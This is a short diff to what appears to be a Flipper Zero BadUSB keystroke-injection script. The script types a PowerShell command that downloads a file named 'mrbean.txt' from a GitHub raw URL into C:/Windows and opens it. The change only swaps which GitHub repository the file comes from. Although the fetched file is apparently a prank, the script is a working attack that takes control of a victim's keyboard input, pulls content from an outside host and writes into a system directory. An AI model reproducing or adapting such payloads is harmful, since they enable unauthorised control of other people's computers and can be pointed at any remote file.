@@ -14,5 +14,5 @@ LEFTARROW
 DELAY 500
 ENTER
 DELAY 700
-STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/UNC0V3R3D/ressources/main/mrbean.txt -OutFile C:/Windows/6565.txt; Start-Process -FilePath "C:/windows/6565.txt" -WindowStyle maximized
+STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/JLH993/flipperzero_resources/main/mrbean.txt -OutFile C:/Windows/6565.txt; Start-Process -FilePath "C:/windows/6565.txt" -WindowStyle maximized
 ENTER
